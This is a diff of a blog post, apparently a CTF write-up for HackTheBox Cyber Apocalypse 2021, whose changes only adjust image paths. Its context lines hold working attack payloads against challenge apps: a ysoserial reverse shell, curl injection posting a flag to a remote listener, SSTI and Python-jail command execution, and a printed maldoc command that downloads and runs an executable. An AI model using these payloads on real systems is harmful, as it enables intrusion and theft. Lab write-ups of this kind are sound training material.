@@ -3,13 +3,13 @@ layout: post
 title:  "HackTheBox CyberApocalypse CTF 21 write-up"
 date:   2021-04-24
 categories: CTF
-thumbnail: /img/htb-cyberapocalypsectf2021.png
+thumbnail: /img/htb-cyberapocalypsectf2021.png#center
 tags: HTB,CyberApocalypseCTF21,web,forensics,misc
 ---
 
 We participated in the 5 days long Cyber Apocalypse CTF 21 hosted by HackTheBox and secured 94th place against 4740 teams comprised of 9900 players! I had final exams during this event but it's the first public CTF of HackTheBox! How could I resist? 
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424083614.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424083614.png#center)
 
 Here is an index of all the challenges I solved, click on them to move to specific challenge write-up:
 
@@ -50,11 +50,11 @@ Here is an index of all the challenges I solved, click on them to move to specif
 
 First we are given a login panel on the homepage. Submitting credential "admin:admin" works
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424032130.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424032130.png#center)
 
 Next, we are to type in a country name and a type of worm and launch to attack a country. If we intercept the payload, it looks like following:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210422203513.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210422203513.png#center)
 
 Base64 encoded serialized Java objects starts with "rO0" that we can observe on the "worm" parameter.
 
@@ -115,7 +115,7 @@ python3 fuzz.py wordlists/FasterXML_blacklist.list [REDACTED].d.requestbin.net
 
 Soon, checking results in requestbin, saw records showing up:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/2021-04-22_20-03.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/2021-04-22_20-03.png#center)
 
 Based on the received callback output, we know we can use "CommonsCollections4" gadget in &nbsp;`ysoserial`&nbsp; to generate our payload.
 
@@ -133,7 +133,7 @@ ysoserial CommonsCollections4 'bash -c {bash,/tmp/pb}' | base64 -w0
 
 Got reverse shell as root:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210422202221.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210422202221.png#center)
 
 The flag was located in "/root/flag.txt"
 
@@ -145,13 +145,15 @@ CHTB{sw33t_l33t_s3r14lzz_@$#?}
 
 ## # emoji voting
 
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425030019.png#center)
+
 We are given source code of the application, The application is based on NodeJS and uses SQLite database. We can see on the "challenge/views/database.js" file the "getEmojis" function does not use parametrization before adding user input to SQL query:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424053017.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424053017.png#center)
 
 This introduces a blind SQL injection vulnerability. We can see from "challenge/routes/index.js", this function is invoked when a request is made to "/api/list" endpoint:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424053344.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424053344.png#center)
 
 Here is the full script I wrote in a hurry during the event, so it may look bad but it gets the job done!
 
@@ -277,11 +279,13 @@ CHTB{order_me_this_juicy_info}
 
 ## # BiltzProp
 
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425030231.png#center)
+
 This challenge contained a Prototype Pollution to RCE via AST Injection.
 
 We can see on the "challenge/routes/index.js" file, "unflatten" function from "flat" module was called on request-body/post data:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424054510.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424054510.png#center)
 
 From "package.json" file we can see the "flat" module package installed is "5.0.0" which suffers from a Prototype Pollution vulnerability via Abstract Syntax Tree. You can read detailed explanation of this vulnerability from below blog post:
 
@@ -315,9 +319,11 @@ CHTB{p0llute_with_styl3}
 
 ## # MiniSTRyplace
 
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425030433.png#center)
+
 This was one of the easiest web challenges. We were given application source code. There was a local file inclusion vulnerability located in "challenge/index.php" file:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424055413.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424055413.png#center)
 
 We can see it replaces "../" with blank so if we submit "..././", it becomes "../" allowing path traversal and access to the flag. The flag was retrieved with single GET request:
 
@@ -342,9 +348,11 @@ CHTB{b4d_4li3n_pr0gr4m1ng}
 &nbsp;
 ## # Caas
 
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425030651.png#center)
+
 This was also one of the easiest web challenges. We were given application source code. There was an argument injection vulnerability on "curl" command which can be seen on "challenge/models/CommandModel.php":
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424055939.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424055939.png#center)
 
 We can't inject arbitrary commands to this because of the "escapeshellcmd()" function but we can add arbitrary parameters. Added parameter to post the flag file on a remote IP where I hosted a netcat listener to view POST data:
 
@@ -373,7 +381,7 @@ CHTB{f1le_r3trieval_4s_a_s3rv1ce}
 
 This challenge contained an XPATH injection vulnerability. We were given an XML file that contained hint to where the flag is:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424061003.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424061003.png#center)
 
 Unfortunately I don't have a screenshot of the web-ui but there was an input field that when submitted searches the string against that XML file using XPATH query.
 
@@ -478,25 +486,27 @@ CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}
 &nbsp;
 ## # The Galactic Times
 
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425033314.png#center)
+
 This was a great challenge with hilarious homepage content. We were given source code of the application. We get a feedback form on the "/feedback" endpoint:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424062932.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424062932.png#center)
 
 When we submit a feedback it calls the "db.addFeedBack" function and after insertion, it calls the "bot.purgeData" function which can be seen on "challenge/routes/index.js" file:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424063305.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424063305.png#center)
 
 The "db.addFeedBack" function simply adds our feedback in database, and the "bot.purgeData" function then uses "puppeteer" module to launch a headless Google Chrome instance and visits the "/list" endpoint to view our feedback. Once visited, it deletes the feedback by calling the "db.migrate" function which can be seen on the "challenge/bot.js" file:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424063507.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424063507.png#center)
 
 Also by observing the source, we know the flag can be viewed on "/alien" endpoint which can only be accessed by localhost hinting somehow we force the bot to visit that page and transfer the flag to us. This localhost check can be seen on "challenge/routes/index.js" file:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424063653.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424063653.png#center)
 
 The feedback value is not sanitized and directly inserted into DOM element so we can have XSS but there is a content-security-policy enforced throughout the application which can be seen on "challenge/index.js":
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424064539.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424064539.png#center)
 
 However the Cloudflare CDN is referenced as an accepted source which allows us to inject script tag with older libraries such as "angular.js" from this CDN and use it's specific tag to get XSS:
 
@@ -515,9 +525,11 @@ The payload first visits the "/alien" endpoint then encodes the page source, and
 
 ## # Starfleet
 
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210425033209.png#center)
+
 This challenge contained an SSTI vulnerability. We were given application source code. We get to submit an email address on the homepage that gets rendered via "nunjucks" templating engine which can be seen on "challenge/helpers/EmailHelper.js":
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424065848.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424065848.png#center)
 
 We also see there is a "readflag" binary that we must run in order to read the flag from /root/flag.txt.
 
@@ -531,7 +543,7 @@ rh0x01{{range.constructor("return global.process.mainModule.require('child_proce
 
 Caught the flag content using netcat listener:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424070257.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424070257.png#center)
 
 ```
 CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}
@@ -572,7 +584,7 @@ olevba -c vbaProject.bin
 
 Clearly it contains malicious macro for code execution:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424071131.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424071131.png#center)
 
 There is a VBA Emulation engine written in python called "ViperMonkey" which can be used to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files.
 
@@ -586,7 +598,7 @@ docker/dockermonkey.sh invite.docm
 
 The payload was deobfuscated and it displayed the shell command that was being executed:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424072833.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424072833.png#center)
 
 Base64 decoded the encoded payload in UTF-8LE format and got following code:
 
@@ -612,7 +624,7 @@ CHTB{maldocs_are_the_new_meta}
 
 Extracted the pptx file, observed a cmd command on "slides/_rels/slide1.xml.rels" file:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424073815.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424073815.png#center)
 
 The command when url-decoded:
 
@@ -622,7 +634,7 @@ cmd.exe /V:ON/C"set yM="o$ eliftuo- exe.x/neila.htraeyortsed/:ptth rwi ;'exe.99z
 
 It is written in reverse but we can see the binary name "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99" is a url-safe base64 encoded payload:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424074033.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424074033.png#center)
 
 ```
 CHTB{pH1sHiNg_w0_m4cr0s???}
@@ -702,7 +714,7 @@ CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}
 
 On this challenge, when we give input it gets evaluated by "exec" in Python2, we can confirm this by supplying "\__builtins__":
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424074736.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424074736.png#center)
 
 Since we have builtin functions access, we can easily get code execution:
 
@@ -710,7 +722,7 @@ Since we have builtin functions access, we can easily get code execution:
 ().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('id')
 ```
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424074846.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424074846.png#center)
 
 the flag.txt was present in current directory:
 
@@ -718,7 +730,7 @@ the flag.txt was present in current directory:
 ().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']('os').system('cat flag.txt')
 ```
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075039.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075039.png#center)
 
 ```
 CHTB{4li3n5_us3_pyth0n2.X?!}
@@ -736,17 +748,17 @@ exec(text, {'__builtins__': None, 'print':print})
 
 We can still print stuffs out because print function is supplied to exec.
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075238.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075238.png#center)
 
 When I try a classic Python3 payload to get to "system" function from "os" module, we get "No Quotes Allowed!" error so we can't use quotes in our payload.
 
 We can reach the subclasses:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075420.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075420.png#center)
 
 The "os.popen" method or "catch\_warnings" class is not available in this list, there's "os.\_wrap_close" present on "132" index.
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075604.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424075604.png#center)
 
 I can reach globals dictionary from this class:
 
@@ -758,7 +770,7 @@ The globals dictionary contained "os.popen" function but remember we cannot use 
 
 The bypass lies in the help string present within many of those classes accessible via ".\__doc__". We can save the help string in a variable and then use list index to reach each character to build out a string. For example, to build the string "popen":
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424080200.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424080200.png#center)
 
 We can now reach the popen function and execute commands the same way by building string from characters.
 
@@ -771,7 +783,7 @@ x=().__doc__;print(().__class__.__base__.__subclasses__()[132].__init__.__global
 
 ```
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424080519.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424080519.png#center)
 
 We can see the flag there, we can convert the command "cat flag.txt" like we did for previous commands to read the flag. But the help string we got from first class did not contain the letter "x", so I had to check other classes that were available and their help string if they contained the letter "x". Got it from a class that was present on 10th index. 
 
@@ -787,7 +799,7 @@ Now the final payload:
 x=().__doc__;print(().__class__.__base__.__subclasses__()[132].__init__.__globals__.get(x[84]+x[34]+x[84]+x[26]+x[24])(x[25]+x[14]+x[13]+x[18]+x[31]+x[3]+x[14]+x[38]+x[27]+x[13]+().__class__.__base__.__subclasses__()[10].__doc__[19]+x[13]).read())
 ```
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424080813.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424080813.png#center)
 
 ```
 CHTB{n0_j4il_c4n_h4ndl3_m3!}
@@ -805,19 +817,19 @@ We were given a file named "compromised.sal". The file can be opened with a tool
 
 After opening the program, loaded the capture data file that was given and switched to "Analyzers" tab. From there, clicked on "+" icon at top right and selected "I2C". Added The channels like below:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081423.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081423.png#center)
 
 After the analyzer is loaded, selected terminal view and saw following hex data:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081545.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081545.png#center)
 
 I first extracted all the hex values and tried decoding it via CyberChef:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081624.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081624.png#center)
 
 We can see portions that looks like flag. I then cross matched the chars "C","H","T","B" with terminal output and saw those characters were printed in hex when the write was done to "0x2C". So I removed all other hex values that were not written to "0x2C" and decoded via CyberChef:
 
-![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081840.png)
+![](/img/2021_04_24_htb_cyberapocalypse_ctf_writeup/20210424081840.png#center)
 
 ```
 CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}
